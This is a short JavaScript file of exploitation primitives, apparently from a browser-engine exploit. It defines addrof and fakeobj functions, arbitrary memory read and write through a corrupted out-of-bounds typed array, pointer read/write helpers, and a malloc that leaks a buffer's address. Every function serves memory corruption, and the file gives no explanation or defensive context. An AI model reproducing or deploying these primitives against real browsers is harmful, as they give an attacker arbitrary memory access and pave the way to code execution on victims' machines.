function i48_put(x, arr) {
  arr[4] = x | 0;
  arr[5] = (x / 4294967296) | 0;
}

function i48_get(arr) {
  return arr[4] + arr[5] * 4294967296;
}

function addrof(obj) {
  leakObj.a = obj;
  return i48_get(leakArr);
}

function fakeobj(addr) {
  i48_put(addr, leakArr);
  return leakObj.a;
}

function rw_mem_setup(ptr, size) {
  i48_put(ptr, oobMaster);
  oobMaster[6] = size;
}

function read_mem(ptr, size) {
  rw_mem_setup(ptr, size);
  return Array.from(oobSlave.slice(0, size));
}

function read_mem_s(ptr, size) {
  rw_mem_setup(ptr, size);
  return oobSlave.toString();
}

function read_mem_bytes(ptr, size) {
  rw_mem_setup(ptr, size);
  var bytes = new Uint8Array(size);
  bytes.set(oobSlave);
  return bytes;
}

function read_mem_as_string(ptr, size) {
  var bytes = read_mem_bytes(ptr, size);
  var ans = "";
  for (var i = 0; i < bytes.length; i++) {
    ans += String.fromCharCode(bytes[i]);
  }
  return ans;
}

function write_mem(ptr, data) {
  rw_mem_setup(ptr, data.length);
  oobSlave.set(data);
}

function read_ptr_at(ptr) {
  var ans = 0;
  var bytes = read_mem(ptr, 8);
  for (var i = 7; i >= 0; i--) {
    ans = 256 * ans + bytes[i];
  }
  return ans;
}

function write_ptr_at(ptr, data) {
  var bytes = [];
  for (var i = 0; i < 8; i++) {
    bytes.push(data & 0xff);
    data /= 256;
  }
  write_mem(ptr, bytes);
}

function hex(x) {
  return Number(x).toString(16);
}

var malloc_nogc = [];

function malloc(size) {
  var arr = new Uint8Array(size);
  malloc_nogc.push(arr);
  return read_ptr_at(addrof(arr) + 0x10);
}
